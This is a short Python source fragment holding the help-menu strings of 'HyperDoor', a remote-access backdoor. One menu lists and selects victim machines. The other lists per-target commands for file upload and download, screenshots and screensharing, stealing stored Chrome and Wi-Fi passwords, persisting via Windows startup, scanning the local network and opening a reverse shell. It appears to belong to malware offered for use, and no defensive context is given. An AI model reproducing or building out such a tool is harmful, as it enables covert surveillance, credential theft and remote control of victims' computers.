HELP_TARGET_COMS ='''
[+] Target Coms | HyperDoor's target interaction interface
[+] Usage: [command] [options]
[+] Full list of available commands:
      -  help                                --> Display this help message
      -  exit                                --> Exits the current target session
      -  clear                               --> Clears the screen
      -  upload (file)                       --> Uploads file to the target file system
      -  download (file)                     --> Downloads file from the target file system
      -  system-info                         --> Displays system information
      -  location                            --> Displays the current target location
      -  detatch                             --> Detatches the current target session from the network
      -  screenshot                          --> Take a screenshot and send it to the server
      -  screenshare                         --> Start screensharing
      -  chrome-passwords                    --> Fetch all stored chrome passwords
      -  wifi-passwords                      --> Fetch all stored wifi passwords
      -  enable-startup (RegName) (FileName) --> Enable backdoor on Windows start-up
      -  connected-machines                  --> List all the hosts connected to the same network as the target (and optionaly their names)
      -  reverse-shell                       --> Start the reverse shell
'''

HELP = '''
[+] HyperDoor
[+] Usage: [command]
[+] Full list of available commands:
      -  help                                --> Display this help message
      -  exit                                --> Exit HyperDoor
      -  clear                               --> Clears the screen
      -  list-targets                        --> List all available targets
      -  session-pick                        --> Shows a menu to pick a target to interact
      -  using [index]                       --> Chooses a target to interact with directly (without using the session-pick menu)
'''